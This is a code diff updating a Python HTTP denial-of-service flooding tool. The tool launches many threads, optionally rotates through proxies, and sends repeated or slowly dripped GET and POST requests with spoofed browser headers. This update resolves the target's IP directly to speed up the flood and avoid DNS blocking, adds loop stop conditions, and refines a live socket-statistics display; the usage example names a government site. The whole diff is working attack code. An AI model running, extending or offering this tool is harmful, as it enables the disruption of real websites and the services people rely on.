@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-#version: 2.5.5-beta
+#version: 2.5.5.1-beta
 
 #built-in libs
 import collections
@@ -246,7 +246,7 @@ def sudos(url: str, **kwargs) -> None:
         connected = False
         settings.connecting += 1
         attempted_connection = True
-        sock.connect((url.domain, int(url.port)))
+        sock.connect((settings.domain_ip, int(url.port)))
         settings.connecting -= 1
         settings.connected += 1
         connected = True
@@ -263,7 +263,7 @@ def sudos(url: str, **kwargs) -> None:
 
         method = kwargs.get("method")
         if method == 1:
-            while True:
+            while settings.status != 0:
                 headers = {}
                 headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
                 headers["Accept-Encoding"] = "gzip, deflate"
@@ -301,7 +301,7 @@ def sudos(url: str, **kwargs) -> None:
                 sock.send(http.encode())
                 time.sleep(delay)
         elif method == 2:
-            while True:
+            while settings.status != 0:
                 headers = {}
                 headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
                 headers["Accept-Encoding"] = "gzip, deflate"
@@ -338,6 +338,8 @@ def sudos(url: str, **kwargs) -> None:
                 http = f"POST {url.path} HTTP/1.1\r\nHost: {url.domain}\r\n{headers_string}\r\n\r\n"
                 sock.send(http.encode())
                 for data in content:
+                    if settings.status == 0:
+                        break
                     sock.send(data.encode())
                     time.sleep(delay)
                 time.sleep(delay)
@@ -366,10 +368,13 @@ def attackrunner(args) -> None:
             settings.status = 0
             return
 
-        if not urlsplit(args.url):
+        url = urlsplit(args.url)
+        if not url:
             print(f"[-] Invalid URL format. EXAMPLE: https://cia.gov/")
             settings.status = 0
             return
+        domain_ip = socket.gethostbyname(url.domain)
+        settings.domain_ip = domain_ip # added this so your DNS server doesn't block your IP and make the connection more even faster
 
         settings.max_threads = args.threads
         loaduseragent()
@@ -387,7 +392,7 @@ def attackrunner(args) -> None:
                 fetchproxy()
             loadproxy()
             settings.status = 2
-            while True:
+            while settings.status != 0:
                 for proxy in settings.proxies:
                     proxy = proxy.strip()
                     kwargs["proxy"] = proxy
@@ -399,7 +404,7 @@ def attackrunner(args) -> None:
                         break
         else:
             settings.status = 2
-            while True:
+            while settings.status != 0:
                 if settings.active_threads >= settings.max_threads:
                     continue
                 threading.Thread(target=sudos, args=[args.url], kwargs=kwargs, daemon=True).start()
@@ -415,9 +420,13 @@ def c_main(scr):
     curses.nocbreak()
     curses.curs_set(0)
     curses.use_default_colors()
-    curses.init_pair(1, 196, -1)
-    curses.init_pair(2, 51, -1)
-    curses.init_pair(3, 230, -1)
+    use_color = True
+    try:
+        curses.init_pair(1, 196, -1)
+        curses.init_pair(2, 51, -1)
+        curses.init_pair(3, 230, -1)
+    except Exception:
+        use_color = False
 
     scr.clear()
 
@@ -425,34 +434,62 @@ def c_main(scr):
 
     window = curses.newwin(0, 0, 0, 0)
 
-    while True:
-        sx, sy = window.getmaxyx()
+    if use_color:
+        while True:
+            sx, sy = window.getmaxyx()
 
-        if sx > 0 and sy > 0:
-            window.addnstr(0, 0, "SOCKET STATISTICS", sy, curses.color_pair(1))
+            if sx > 0 and sy > 0:
+                window.addnstr(0, 0, "SOCKET STATISTICS", sy, curses.color_pair(1))
 
-            if sx > 2:
-                window.addnstr(1, 0, "CONNECTING:", sy, curses.color_pair(2))
-                if separator < sy:
-                    window.addnstr(1, separator, f"{settings.connecting}{' ' * (sy - separator)}", sy - separator, curses.color_pair(3))
-
-                if sx > 3:
-                    window.addnstr(2, 0, "CONNECTED:", sy, curses.color_pair(2))
+                if sx > 2:
+                    window.addnstr(1, 0, "CONNECTING:", sy, curses.color_pair(2))
                     if separator < sy:
-                        window.addnstr(2, separator, f"{settings.connected}{' ' * (sy - separator)}", sy - separator, curses.color_pair(3))
+                        window.addnstr(1, separator, f"{settings.connecting}{' ' * (sy - separator)}", sy - separator, curses.color_pair(3))
 
-                    if sx > 4:
-                        window.addnstr(3, 0, "CLOSED:", sy, curses.color_pair(2))
+                    if sx > 3:
+                        window.addnstr(2, 0, "CONNECTED:", sy, curses.color_pair(2))
                         if separator < sy:
-                            window.addnstr(3, separator, f"{settings.closed}{' ' * (sy - separator)}", sy - separator, curses.color_pair(3))
+                            window.addnstr(2, separator, f"{settings.connected}{' ' * (sy - separator)}", sy - separator, curses.color_pair(3))
 
-                        if sx > 5:
-                            window.addnstr(4, 0, "FAILS:", sy, curses.color_pair(2))
+                        if sx > 4:
+                            window.addnstr(3, 0, "CLOSED:", sy, curses.color_pair(2))
                             if separator < sy:
-                                window.addnstr(4, separator, f"{settings.fails}{' ' * (sy - separator)}", sy - separator, curses.color_pair(3))
+                                window.addnstr(3, separator, f"{settings.closed}{' ' * (sy - separator)}", sy - separator, curses.color_pair(3))
 
-        window.refresh()
-        time.sleep(.1)
+                            if sx > 5:
+                                window.addnstr(4, 0, "FAILS:", sy, curses.color_pair(2))
+                                if separator < sy:
+                                    window.addnstr(4, separator, f"{settings.fails}{' ' * (sy - separator)}", sy - separator, curses.color_pair(3))
+            window.refresh()
+            time.sleep(1 / 1000)
+    else:
+        while True:
+            sx, sy = window.getmaxyx()
+
+            if sx > 0 and sy > 0:
+                window.addnstr(0, 0, "SOCKET STATISTICS", sy)
+
+                if sx > 2:
+                    window.addnstr(1, 0, "CONNECTING:", sy)
+                    if separator < sy:
+                        window.addnstr(1, separator, f"{settings.connecting}{' ' * (sy - separator)}", sy - separator)
+
+                    if sx > 3:
+                        window.addnstr(2, 0, "CONNECTED:", sy)
+                        if separator < sy:
+                            window.addnstr(2, separator, f"{settings.connected}{' ' * (sy - separator)}", sy - separator)
+
+                        if sx > 4:
+                            window.addnstr(3, 0, "CLOSED:", sy)
+                            if separator < sy:
+                                window.addnstr(3, separator, f"{settings.closed}{' ' * (sy - separator)}", sy - separator)
+
+                            if sx > 5:
+                                window.addnstr(4, 0, "FAILS:", sy)
+                                if separator < sy:
+                                    window.addnstr(4, separator, f"{settings.fails}{' ' * (sy - separator)}", sy - separator)
+            window.refresh()
+            time.sleep(1 / 1000)
 
 
 def main():
@@ -477,9 +514,12 @@ def main():
                 sys.exit()
             elif settings.status == 2:
                 break
+
         curses.wrapper(c_main)
     except KeyboardInterrupt:
         sys.exit()
+    finally:
+        settings.status = 0
 
 if __name__ == "__main__":
     main()
